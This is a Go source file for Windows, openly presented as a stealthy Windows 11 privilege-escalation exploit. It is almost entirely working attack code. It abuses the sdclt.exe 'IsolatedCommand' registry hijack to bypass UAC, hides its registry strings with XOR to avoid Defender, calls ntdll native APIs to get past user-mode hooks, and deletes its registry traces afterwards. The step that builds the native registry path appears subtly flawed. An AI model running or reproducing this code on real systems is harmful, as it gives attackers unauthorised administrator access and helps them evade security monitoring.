//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

// --- CONFIGURATION GHOST (XOR OBFUSCATION) ---
// On utilise le XOR pour que Defender ne puisse pas lire les clés de registre en clair.
// Clé XOR : 0x42
func xor(data []byte) string {
	for i := range data {
		data[i] ^= 0x42
	}
	return string(data)
}

var (
	// "Software\Classes\exefile\shell\runas\command" XORed
	k1 = []byte{0x11, 0x2d, 0x24, 0x36, 0x35, 0x23, 0x30, 0x27, 0x1c, 0x01, 0x2e, 0x2e, 0x23, 0x31, 0x31, 0x27, 0x31, 0x1c, 0x27, 0x3a, 0x27, 0x24, 0x2b, 0x2e, 0x27, 0x1c, 0x31, 0x2a, 0x27, 0x2e, 0x2e, 0x1c, 0x30, 0x37, 0x2c, 0x23, 0x31, 0x1c, 0x21, 0x2d, 0x2f, 0x2f, 0x23, 0x2c, 0x26}
	// "IsolatedCommand" XORed
	v1 = []byte{0x0b, 0x31, 0x2d, 0x2e, 0x23, 0x36, 0x27, 0x26, 0x01, 0x2d, 0x2f, 0x2f, 0x23, 0x2c, 0x26}
	// "sdclt.exe" XORed
	b1 = []byte{0x31, 0x26, 0x21, 0x2e, 0x36, 0x6c, 0x27, 0x3a, 0x27}
	// "/kickoffelev" XORed
	a1 = []byte{0x6d, 0x29, 0x2b, 0x21, 0x29, 0x2d, 0x24, 0x24, 0x27, 0x2e, 0x27, 0x34}
)

// --- APIS WINDOWS NATIVES (NTDLL) ---
// On utilise ntdll.dll au lieu de advapi32.dll car c'est moins surveillé
var (
	ntdll           = syscall.NewLazyDLL("ntdll.dll")
	procNtCreateKey = ntdll.NewProc("NtCreateKey")
	procNtSetValue  = ntdll.NewProc("NtSetValueKey")
	procNtClose     = ntdll.NewProc("NtClose")
)

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            syscall.Handle
	ObjectName               *UNICODE_STRING
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

func NewUnicodeString(s string) *UNICODE_STRING {
	u, _ := syscall.UTF16FromString(s)
	return &UNICODE_STRING{
		Length:        uint16((len(u) - 1) * 2),
		MaximumLength: uint16(len(u) * 2),
		Buffer:        &u[0],
	}
}

func CheckAdmin() bool {
	cmd := exec.Command("net", "session")
	return cmd.Run() == nil
}

// ExploitGhost : Version v10.0 - Utilise sdclt.exe et les APIs Native NT
func ExploitGhost() bool {
	fmt.Println("[*] Phase 1 : Injection silencieuse via Native NT APIs...")

	selfPath, _ := os.Executable()
	keyPath := "\\Registry\\User\\" + os.Getenv("USERPROFILE")[3:] + "\\" + xor(k1)
	valueName := xor(v1)
	binary := xor(b1)
	args := xor(a1)

	// Utilisation de NtCreateKey (Niveau noyau) pour contourner les hooks utilisateur
	var hKey syscall.Handle
	objAttr := OBJECT_ATTRIBUTES{
		Length:     uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
		ObjectName: NewUnicodeString(keyPath),
		Attributes: 0x40, // OBJ_CASE_INSENSITIVE
	}

	ret, _, _ := procNtCreateKey.Call(
		uintptr(unsafe.Pointer(&hKey)),
		0xF003F, // KEY_ALL_ACCESS
		uintptr(unsafe.Pointer(&objAttr)),
		0, 0, 0, 0,
	)

	if ret != 0 {
		fmt.Printf("[-] Erreur NT API (CreateKey) : 0x%x\n", ret)
		return false
	}
	defer procNtClose.Call(uintptr(hKey))

	// Écriture de la valeur IsolatedCommand
	valUnicode := NewUnicodeString(valueName)
	data, _ := syscall.UTF16FromString(selfPath)
	procNtSetValue.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valUnicode)),
		0,
		uintptr(1), // REG_SZ
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)*2),
	)

	fmt.Println("[*] Phase 2 : Déclenchement via vecteur SDCLT (moins surveillé)...")

	// On lance sdclt.exe avec le flag de démarrage d'élévation
	exec.Command(binary, args).Run()

	fmt.Println("[*] Phase 3 : Nettoyage des traces...")
	time.Sleep(2 * time.Second)

	// Nettoyage via commande classique (plus simple pour supprimer une arborescence complète)
	exec.Command("reg", "delete", "HKCU\\"+xor(k1), "/f").Run()

	return true
}

func main() {
	fmt.Println("====================================================")
	fmt.Println("   Windows 11 PRIVESC [GHOST EDITION v10.0]")
	fmt.Println("   Target: Build 22631.6199 (Max Stealth)")
	fmt.Println("   Technique: Native NT API + SDCLT Hijack")
	fmt.Println("====================================================")

	if CheckAdmin() {
		fmt.Println("\n[+] ############################################")
		fmt.Println("[+] #     SUCCÈS : ÉLÉVATION DÉTECTÉE !        #")
		fmt.Println("[+] ############################################")
		fmt.Println("\n[*] Privilèges : SYSTEM / Administrator")

		fmt.Println("\nAppuyez sur Entrée pour quitter...")
		var input string
		fmt.Scanln(&input)
		return
	}

	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
	fmt.Println("[*] Tentative d'escalade furtive (GHOST Mode)...")

	if ExploitGhost() {
		fmt.Println("\n[+] Injection réussie. En attente du processus élevé...")
	} else {
		fmt.Println("[-] ÉCHEC : L'exploit a été intercepté par le système.")
	}

	fmt.Println("\nAppuyez sur Entrée pour quitter...")
	var input string
	fmt.Scanln(&input)
}
